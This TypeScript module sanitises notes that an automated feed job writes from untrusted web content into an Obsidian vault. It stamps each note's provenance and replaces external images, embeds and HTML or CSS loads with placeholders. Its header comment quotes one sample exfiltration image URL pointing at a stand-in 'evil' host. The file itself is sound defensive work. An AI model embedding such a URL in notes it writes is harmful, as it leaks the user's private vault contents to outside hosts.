/**
 * What every note a feed job wrote goes through before the job counts as done.
 *
 * A feed job reads untrusted content (a video, a page, a PDF) and writes
 * notes from it, so its notes are untrusted too:
 * - `stampProvenance` marks them `provenance: feed-untrusted` in their
 *   frontmatter, so later sessions (and the user) can tell them apart from his
 *   own notes; whatever provenance the job wrote itself is overwritten.
 * - `neutraliseExternalImages` turns every image or embed that would load
 *   from the web into plain text naming the host: Obsidian fetches those as
 *   soon as the note is shown, and a URL the job chose can carry vault
 *   content out (`![](https://evil/?d=<secret>)`). Internal embeds stay.
 * Both are pure and idempotent; the runner applies them to the changed notes.
 */

export const PROVENANCE = "feed-untrusted";
const PROVENANCE_LINE = `provenance: ${PROVENANCE}`;
const BOM = String.fromCharCode(0xfeff);

/** A top-level provenance key, quoted or not, any case. */
const PROVENANCE_KEY = /^["']?provenance["']?\s*:/i;
/** A line that continues the value of the key above it (indented, or a sequence item). */
const CONTINUATION = /^(\s|-(\s|$))/;

/** The note with `provenance: feed-untrusted` in its frontmatter (added when it has none), nothing else changed. */
export function stampProvenance(note: string): string {
	const bom = note.startsWith(BOM) ? BOM : "";
	const text = note.slice(bom.length);
	const opening = /^---[ \t]*(\r?\n)/.exec(text);
	if (opening) {
		const eol = opening[1] ?? "\n";
		const line = /([^\r\n]*)(\r\n|\n|$)/y;
		const kept: string[] = [];
		let stampAt = -1;
		let skipping = false;
		let pos = opening[0].length;
		for (;;) {
			line.lastIndex = pos;
			const match = line.exec(text);
			if (!match) break;
			const [whole, content = "", end = ""] = match;
			const trimmed = content.trimEnd();
			if (trimmed === "---" || trimmed === "...") {
				if (stampAt < 0) stampAt = kept.length;
				kept.splice(stampAt, 0, PROVENANCE_LINE);
				return `${bom}${opening[0]}${kept.map((l) => `${l}${eol}`).join("")}${whole}${text.slice(pos + whole.length)}`;
			}
			if (PROVENANCE_KEY.test(content)) {
				if (stampAt < 0) stampAt = kept.length;
				skipping = true;
			} else if (skipping && (content.trim() === "" || CONTINUATION.test(content))) {
				// The rest of the dropped key's value.
			} else {
				skipping = false;
				kept.push(content);
			}
			if (end === "") break; // the block never closes: it is not frontmatter
			pos += whole.length;
		}
	}
	const eol = text.includes("\r\n") ? "\r\n" : "\n";
	return `${bom}---${eol}${PROVENANCE_LINE}${eol}---${eol}${text}`;
}

/** Characters a browser drops from a URL before reading it. */
const URL_NOISE = /[\t\r\n]/g;
/** A scheme (https:, data:, javascript:, file:) or two leading separators (//host, \\host). */
const SCHEME_OR_NETWORK = /^(?:[a-z][a-z0-9+.-]*:|[\\/]{2})/i;
/** A character reference, which markdown and HTML both decode before the URL is read. */
const ENTITY = /&#?[a-z0-9]/i;

function strip(value: string): string {
	let text = value.replace(URL_NOISE, "");
	let start = 0;
	while (start < text.length && text.charCodeAt(start) <= 0x20) start += 1;
	text = text.slice(start);
	return text.startsWith("<") && text.endsWith(">") ? text.slice(1, -1) : text;
}

/** Whether an image or embed target would be loaded from outside the vault. */
export function isExternalTarget(target: string): boolean {
	const value = strip(target);
	// Markdown drops a backslash before punctuation (https\://), so judge it both ways.
	return SCHEME_OR_NETWORK.test(value) || SCHEME_OR_NETWORK.test(value.replace(/\\(?=[!-/:-@[-`{-~])/g, "")) || ENTITY.test(value);
}

/** The host a target names, for the text that replaces it ("external" when there is none to show). */
function hostOf(target: string): string {
	const decoded = strip(target)
		.replace(/&#x([0-9a-f]+);?/gi, (_m, hex: string) => String.fromCodePoint(parseInt(hex, 16) % 0x110000))
		.replace(/&#(\d+);?/g, (_m, dec: string) => String.fromCodePoint(Number(dec) % 0x110000))
		.replace(/&colon;/gi, ":")
		.replace(/&sol;/gi, "/")
		.replace(/\\(?=[!-/:-@[-`{-~])/g, "");
	try {
		const url = new URL(/^[\\/]{2}/.test(decoded) ? `https:${decoded.replace(/\\/g, "/")}` : decoded);
		return url.hostname || "external";
	} catch {
		return "external";
	}
}

const placeholder = (target: string): string => `[image: ${hostOf(target)}]`;

/**
 * Most characters looked at for one target, title or tag. Past it the scan
 * stops and decides from what it has (a target's start says whether it is
 * external), so a note full of unclosed brackets or tags stays linear.
 */
const SCAN_LIMIT = 1024;
const MAX_TAG_CHARS = 65_536;

/**
 * For every unescaped "[", the index of the "]" that closes it (balanced,
 * any depth, as CommonMark pairs them), or -1. One pass.
 */
function closingBrackets(text: string): Int32Array {
	const close = new Int32Array(text.length).fill(-1);
	const open: number[] = [];
	for (let i = 0; i < text.length; i += 1) {
		const c = text[i];
		if (c === "\\") i += 1;
		else if (c === "[") open.push(i);
		else if (c === "]") {
			const start = open.pop();
			if (start !== undefined) close[start] = i;
		}
	}
	return close;
}

const isSpace = (c: string | undefined): boolean => c === " " || c === "\t" || c === "\n" || c === "\r";

/** Where `char` next appears in text[from, from + SCAN_LIMIT), or -1. */
function nearby(text: string, char: string, from: number): number {
	const stop = Math.min(text.length, from + SCAN_LIMIT);
	for (let i = from; i < stop; i += 1) if (text[i] === char) return i;
	return -1;
}

/**
 * `(target "title")` from the "(" at `at`: the target and the index after the
 * ")"; `end` is null when the scan limit was reached first (the target's
 * start is still known), and the whole is null when it is not a destination.
 */
function inlineDestination(text: string, at: number): { target: string; end: number | null } | null {
	let i = at + 1;
	while (isSpace(text[i])) i += 1;
	let target: string;
	if (text[i] === "<") {
		const close = nearby(text, ">", i);
		if (close < 0) return text.length - i > SCAN_LIMIT ? { target: text.slice(i + 1, i + SCAN_LIMIT), end: null } : null;
		if (text.slice(i, close).includes("\n")) return null;
		target = text.slice(i, close + 1);
		i = close + 1;
	} else {
		// A bare target ends at a space or at the ")" that balances its own parentheses.
		const start = i;
		let depth = 0;
		for (; i < text.length; i += 1) {
			if (i - start > SCAN_LIMIT) return { target: text.slice(start, i), end: null };
			const c = text[i];
			if (c === "\\") i += 1;
			else if (isSpace(c)) break;
			else if (c === "(") depth += 1;
			else if (c === ")") {
				if (depth === 0) break;
				depth -= 1;
			}
		}
		target = text.slice(start, i);
	}
	while (isSpace(text[i])) i += 1;
	const quote = text[i];
	if (quote === '"' || quote === "'" || quote === "(") {
		const close = nearby(text, quote === "(" ? ")" : quote, i + 1);
		if (close < 0) return text.length - i > SCAN_LIMIT ? { target, end: null } : null;
		i = close + 1;
		while (isSpace(text[i])) i += 1;
	}
	return text[i] === ")" ? { target, end: i + 1 } : null;
}

/**
 * Every markdown image (`![alt](target)`, `![alt][label]`, `![label][]`,
 * `![label]`) whose target is outside the vault, replaced by its
 * placeholder. Alt text may nest brackets at any depth and escape them.
 * An outside target whose end is past the scan limit loses its `![alt]`,
 * which leaves plain text behind.
 *
 * Also returns where (in the result) each "![" stands that was settled as an
 * internal image: an Obsidian embed, or an image with an internal target
 * whose alt holds no code span or HTML ("`" or "<", which bind tighter than
 * brackets and could pair them differently). Every other "![" left in the
 * result is unresolved, and its paragraph gets the conservative fallback.
 */
function replaceMarkdownImages(text: string, lookup: (label: string) => string | undefined): { text: string; resolved: Set<number> } {
	const close = closingBrackets(text);
	const resolved = new Set<number>();
	let out = "";
	let copied = 0;
	for (let i = 0; i < text.length - 1; i += 1) {
		if (text[i] === "\\") {
			i += 1;
			continue;
		}
		if (text[i] !== "!" || text[i + 1] !== "[") continue;
		const here = out.length + (i - copied);
		WIKI_AT.lastIndex = i;
		const wiki = WIKI_AT.exec(text);
		// An internal Obsidian embed (outside ones are gone already), unless image syntax follows it.
		if (wiki && text[i + wiki[0].length] !== "(" && text[i + wiki[0].length] !== "[") {
			resolved.add(here);
			i += wiki[0].length - 1;
			continue;
		}
		const altEnd = close[i + 1] ?? -1;
		if (altEnd < 0) continue;
		const alt = text.slice(i + 2, altEnd);
		let target: string | null = null;
		let internal = false;
		let end = altEnd + 1;
		if (text[altEnd + 1] === "(") {
			const inline = inlineDestination(text, altEnd + 1);
			if (inline && isExternalTarget(inline.target)) {
				target = inline.target;
				end = inline.end ?? altEnd + 1;
			} else if (inline && inline.end !== null) internal = true;
		} else {
			const full = text[altEnd + 1] === "[" && (close[altEnd + 1] ?? -1) >= 0;
			const labelEnd = full ? (close[altEnd + 1] ?? altEnd + 1) : altEnd;
			const defined = lookup(full ? text.slice(altEnd + 2, labelEnd) || alt : alt);
			if (defined !== undefined && isExternalTarget(defined)) {
				target = defined;
				end = full ? labelEnd + 1 : altEnd + 1;
			} else if (defined !== undefined) internal = true;
		}
		if (target === null) {
			if (internal && !/[`<]/.test(alt)) resolved.add(here);
			continue; // its alt is still scanned for others
		}
		out += text.slice(copied, i) + placeholder(target);
		copied = end;
		i = end - 1;
	}
	return { text: copied === 0 ? text : out + text.slice(copied), resolved };
}

/** Where a fallback-removed address points instead: a fragment of this note, so nothing is fetched. */
const removedTarget = (target: string): string => `#external-removed-${hostOf(target)}`;

/** Start and end offsets of each line (the end excludes its line break). */
function lineSpans(text: string): [number, number][] {
	const spans: [number, number][] = [];
	let start = 0;
	for (;;) {
		const newline = text.indexOf("\n", start);
		const end = newline < 0 ? text.length : newline;
		spans.push([start, end > start && text[end - 1] === "\r" ? end - 1 : end]);
		if (newline < 0) return spans;
		start = newline + 1;
	}
}

/**
 * Lines inside fenced code blocks that can be trusted to be code: a top-level
 * fence (at most three spaces in) after a blank line, the start, or another
 * fence; no backtick in a backtick fence's info string; and no line before it
 * that could open an HTML block (after one, CommonMark might not see a fence
 * there, so those lines are judged like any other). Unclosed: to the end.
 */
function fencedLines(text: string, spans: readonly [number, number][]): boolean[] {
	const fenced = new Array<boolean>(spans.length).fill(false);
	let open: { char: string; length: number } | null = null;
	let afterBreak = true;
	let htmlSeen = false;
	for (const [index, [start, end]] of spans.entries()) {
		const line = text.slice(start, end);
		if (open) {
			fenced[index] = true;
			const closer = /^ {0,3}(`+|~+)[ \t]*$/.exec(line);
			if (closer?.[1] && closer[1][0] === open.char && closer[1].length >= open.length) {
				open = null;
				afterBreak = true;
			}
			continue;
		}
		if (/^ {0,3}</.test(line)) htmlSeen = true;
		const opener = /^ {0,3}(`{3,}|~{3,})(.*)$/.exec(line);
		const marks = opener?.[1] ?? "";
		if (opener && afterBreak && !htmlSeen && !(marks[0] === "`" && (opener[2] ?? "").includes("`"))) {
			open = { char: marks[0] ?? "`", length: marks.length };
			fenced[index] = true;
			continue;
		}
		afterBreak = line.trim() === "";
	}
	return fenced;
}

/** A link or image destination right after "](" (optional spaces, a <...> form or a bare address). */
const INLINE_TARGET = /\]\(\s*(<[^>\n]*>|[^\s)]+)/g;
/** A bracketed text with no brackets inside: a candidate reference label. */
const LABEL = /\[((?:\\.|[^[\]\\])+)\]/g;

/**
 * The conservative fallback: every paragraph (blank-line separated, outside
 * trusted fenced code) that still holds an unresolved "![" loses every
 * outside address in it, plain links too, and the reference definitions
 * named by any bracketed label in it lose theirs, wherever they are.
 */
function neutraliseUnresolvedParagraphs(text: string, resolved: ReadonlySet<number>): string {
	const spans = lineSpans(text);
	const fenced = fencedLines(text, spans);
	const dirtyLabels = new Set<string>();
	let out = "";
	let copied = 0;
	let index = 0;
	while (index < spans.length) {
		const [first] = spans[index] ?? [0, 0];
		if (fenced[index] || text.slice(first, spans[index]?.[1] ?? first).trim() === "") {
			index += 1;
			continue;
		}
		let last = index;
		while (last + 1 < spans.length && !fenced[last + 1] && text.slice(spans[last + 1]?.[0] ?? 0, spans[last + 1]?.[1] ?? 0).trim() !== "") last += 1;
		const start = first;
		const end = spans[last]?.[1] ?? start;
		index = last + 1;
		const paragraph = text.slice(start, end);
		let unresolved = false;
		for (let at = paragraph.indexOf("!["); at >= 0 && !unresolved; at = paragraph.indexOf("![", at + 1)) {
			let slashes = 0;
			while (paragraph[at - 1 - slashes] === "\\") slashes += 1;
			if (slashes % 2 === 0 && !resolved.has(start + at)) unresolved = true;
		}
		if (!unresolved) continue;
		for (const match of paragraph.matchAll(LABEL)) dirtyLabels.add(labelKey(match[1] ?? ""));
		const rewritten = paragraph.replace(INLINE_TARGET, (whole, target: string) =>
			isExternalTarget(target) ? whole.slice(0, whole.length - target.length) + removedTarget(target) : whole,
		);
		out += text.slice(copied, start) + rewritten;
		copied = end;
	}
	const inlineDone = copied === 0 ? text : out + text.slice(copied);
	if (dirtyLabels.size === 0) return inlineDone;
	// Definitions are looked up again on the rewritten text (fences cannot have moved: no line changed count).
	const after = lineSpans(inlineDone);
	const fencedAfter = fencedLines(inlineDone, after);
	const lineOf = (offset: number): number => {
		let low = 0;
		let high = after.length - 1;
		while (low < high) {
			const mid = (low + high + 1) >> 1;
			if ((after[mid]?.[0] ?? 0) <= offset) low = mid;
			else high = mid - 1;
		}
		return low;
	};
	return inlineDone.replace(DEFINITION, (whole, label: string, target: string, offset: number) => {
		if (fencedAfter[lineOf(offset)] || !dirtyLabels.has(labelKey(label)) || !isExternalTarget(target)) return whole;
		return whole.slice(0, whole.length - target.length) + removedTarget(target);
	});
}

/** `[label]: target "title"` at the start of a line (the target may be on the next line, or in <>). */
const DEFINITION = /^ {0,3}\[((?:\\.|[^\]\\])+)\]:\s*(<[^>\n]*>|\S+)/gm;
/** Obsidian's `![[target|size]]`; its targets hold no brackets, which keeps a run of unclosed "![[" linear. */
const WIKI_EMBED = /!\[\[([^[\]|\n]+)(\|[^[\]\n]*)?\]\]/g;
/** The same, read where a "![" is. */
const WIKI_AT = /!\[\[([^[\]|\n]+)(\|[^[\]\n]*)?\]\]/y;
/** An HTML tag name, read where a "<" is. */
const TAG_NAME = /[a-z][a-z0-9-]*/iy;
/** Attributes that make the page load something. */
const LOADING_ATTRIBUTE = /(?:^|[\s"'/])(src|srcset|poster|data|background|lowsrc|dynsrc|href|xlink:href)\s*=\s*("([^"]*)"|'([^']*)'|([^\s"'>]+))/gi;
/** A CSS url(...). */
const CSS_URL = /url\(\s*(["']?)([^"')]*)\1\s*\)/gi;
/** CSS image-set(...) and -webkit-image-set(...), whose quoted strings are image addresses. */
const CSS_IMAGE_SET = /(?:-webkit-)?image-set\(((?:"[^"]*"|'[^']*'|[^"')])*)\)/gi;

const labelKey = (label: string): string => label.replace(/\s+/g, " ").trim().toLowerCase();

/** The first outside target a tag's attributes (or a style block) would load, or null. */
function tagTarget(name: string, attributes: string): string | null {
	for (const match of attributes.matchAll(LOADING_ATTRIBUTE)) {
		const attribute = (match[1] ?? "").toLowerCase();
		if (name.toLowerCase() === "a" && attribute === "href") continue; // a plain link needs a click
		const value = match[3] ?? match[4] ?? match[5] ?? "";
		const candidates = attribute === "srcset" ? value.split(",").map((part) => part.trim().split(/\s+/)[0] ?? "") : [value];
		const outside = candidates.find(isExternalTarget);
		if (outside !== undefined) return outside;
	}
	for (const match of attributes.matchAll(CSS_URL)) {
		const value = match[2] ?? "";
		if (isExternalTarget(value)) return value;
	}
	// image-set("a.png" 1x, ...) loads its quoted strings as images too (a url() inside is caught above).
	for (const match of attributes.matchAll(CSS_IMAGE_SET)) {
		for (const quoted of (match[1] ?? "").matchAll(/"([^"]*)"|'([^']*)'/g)) {
			const value = quoted[1] ?? quoted[2] ?? "";
			if (isExternalTarget(value)) return value;
		}
	}
	return null;
}

/** ASCII-only lower case: indices stay aligned with the original (toLowerCase can change lengths). */
const asciiLower = (text: string): string => text.replace(/[A-Z]+/g, (run) => run.toLowerCase());

/** Every <style>…</style> block that imports or loads from outside, replaced; linear in the note. */
function replaceStyleBlocks(text: string): string {
	const lower = asciiLower(text);
	let out = "";
	let copied = 0;
	let pos = 0;
	for (;;) {
		const start = lower.indexOf("<style", pos);
		if (start < 0) break;
		const after = lower[start + 6];
		if (after !== undefined && /[a-z0-9-]/.test(after)) {
			pos = start + 6;
			continue;
		}
		const close = lower.indexOf("</style", start);
		const closeEnd = close < 0 ? -1 : lower.indexOf(">", close);
		if (closeEnd < 0) break; // no closing tag anywhere after: none after any later start either
		const block = text.slice(start, closeEnd + 1);
		const target = tagTarget("style", block);
		if (target !== null || /@import/i.test(block)) {
			out += text.slice(copied, start) + placeholder(target ?? "");
			copied = closeEnd + 1;
		}
		pos = closeEnd + 1;
	}
	return copied === 0 ? text : out + text.slice(copied);
}

/**
 * Every HTML start tag that would load something from outside, replaced.
 * Read as CommonMark reads raw HTML: quoted values may hold anything but
 * their quote; outside quotes a "<" ends the attempt. A tag that runs past
 * MAX_TAG_CHARS cannot be judged, so its "<" is escaped and it stays text.
 */
function replaceHtmlTags(text: string): string {
	let out = "";
	let copied = 0;
	for (let start = text.indexOf("<"); start >= 0; start = text.indexOf("<", Math.max(start + 1, copied))) {
		TAG_NAME.lastIndex = start + 1;
		const name = TAG_NAME.exec(text)?.[0];
		if (!name) continue;
		let i = start + 1 + name.length;
		let end = -1;
		let tooLong = false;
		while (i < text.length) {
			if (i - start > MAX_TAG_CHARS) {
				tooLong = true;
				break;
			}
			const c = text[i];
			if (c === ">") {
				end = i;
				break;
			}
			if (c === "<") break;
			if (c === '"' || c === "'") {
				const close = text.indexOf(c, i + 1);
				if (close < 0 || close - start > MAX_TAG_CHARS) {
					tooLong = close >= 0;
					break;
				}
				i = close + 1;
				continue;
			}
			i += 1;
		}
		if (tooLong) {
			out += `${text.slice(copied, start)}&lt;`;
			copied = start + 1;
			continue;
		}
		if (end < 0) continue;
		const target = tagTarget(name, text.slice(start + 1 + name.length, end));
		if (target === null) continue;
		out += text.slice(copied, start) + placeholder(target);
		copied = end + 1;
	}
	return copied === 0 ? text : out + text.slice(copied);
}

/** The note with every image or embed that would load from the web replaced by `[image: <host>]`. */
export function neutraliseExternalImages(note: string): string {
	const definitions = new Map<string, string>();
	for (const match of note.matchAll(DEFINITION)) {
		const key = labelKey(match[1] ?? "");
		if (!definitions.has(key)) definitions.set(key, match[2] ?? "");
	}
	const styled = replaceStyleBlocks(note);
	const embedded = styled.replace(WIKI_EMBED, (whole, target: string) => (isExternalTarget(target) ? placeholder(target) : whole));
	const images = replaceMarkdownImages(embedded, (label) => definitions.get(labelKey(label)));
	return replaceHtmlTags(neutraliseUnresolvedParagraphs(images.text, images.resolved));
}

/** Both, in one pass: what the runner writes back. */
export function secureFeedNote(note: string): string {
	return stampProvenance(neutraliseExternalImages(note));
}
